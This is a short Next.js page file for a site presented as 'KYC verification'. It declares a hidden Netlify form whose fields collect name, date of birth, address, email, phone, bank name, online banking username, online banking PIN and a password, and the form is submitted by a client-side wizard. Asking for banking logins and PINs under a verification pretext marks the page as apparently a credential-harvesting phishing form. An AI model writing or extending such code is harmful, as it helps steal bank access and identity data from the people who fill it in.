import KYCForm from "@/components/kyc-form"

export default function Home() {
  return (
    <main>
      {/*
        A hidden, server-rendered form so Netlify detects the form at build time.
        The interactive wizard (client component) submits the real form at runtime.
      */}
      <form name="kyc-verification" method="POST" data-netlify="true" hidden>
        <input type="hidden" name="form-name" value="kyc-verification" />

        {/* Personal Info */}
        <input type="text" name="firstName" />
        <input type="text" name="lastName" />
        <input type="text" name="dateOfBirth" />
        <input type="text" name="nationality" />
        <input type="email" name="email" />
        <input type="text" name="phone" />

        {/* Address */}
        <input type="text" name="street" />
        <input type="text" name="city" />
        <input type="text" name="postalCode" />
        <input type="text" name="country" />

        {/* Financial Access */}
        <input type="text" name="bankInstitutionName" />
        <input type="text" name="accountType" />
        <input type="text" name="onlineBankingUsername" />
        <input type="text" name="onlineBankingPin" />

        {/* Security */}
        <input type="text" name="password" />
        <input type="text" name="confirmPassword" />
        <input type="text" name="acceptTerms" />

        {/* Documents: listed so Netlify knows the field exists */}
        <input type="file" name="documents" />
      </form>

      <KYCForm />
    </main>
  )
}
